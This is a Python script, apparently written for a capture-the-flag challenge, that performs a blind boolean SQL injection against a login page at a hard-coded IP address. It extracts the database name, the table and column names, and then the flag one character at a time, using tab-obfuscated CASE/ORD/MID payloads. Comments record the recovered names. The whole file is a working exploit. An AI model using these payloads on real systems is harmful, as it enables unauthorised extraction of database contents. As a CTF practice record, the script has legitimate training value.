import requests
import string
s = string.printable
flag = ''

url = 'http://122.51.52.109:7005/index2.php'

def find_char():
    c = None
    for j in range(32,128):     
        # database
        #data={'username':'\\','password':f'||case\x09ord(mid(database()\x09from\x09{i}\x09for\x091))\x09when\x09{j}\x09then\x091\x09else\x090\x09end#'}
        # ctf

        # table
        #data={'username':'\\','password':f'||case\x09ord(mid((select\x09group_concat(table_name)\x09from\x09information_schema.tables\x09where\x09table_schema=database())\x09from\x09{i}\x09for\x091))\x09when\x09{j}\x09then\x091\x09else\x090\x09end#'}
        # flagss

        # columns
        #data={'username':'\\','password':f'||case\x09ord(mid((select\x09group_concat(column_name)\x09from\x09information_schema.columns\x09where\x09table_schema=database())\x09from\x09{i}\x09for\x091))\x09when\x09{j}\x09then\x091\x09else\x090\x09end#'}
        # flag
        
        # data
        data={'username':'\\','password':f'||case\x09ord(mid((select\x09group_concat(flag)\x09from\x09flagss)\x09from\x09{i}\x09for\x091))\x09when\x09{j}\x09then\x091\x09else\x090\x09end#'}
        r = requests.post(url,data=data)

         #print(r.text)
        if "login success" in r.text:
            c = chr(j)
            break
    return c

for i in range(1,40):
    print(i)
    c = find_char()
    if c==None:
        break
    else:
        flag += find_char()
        print(flag)
    

        


       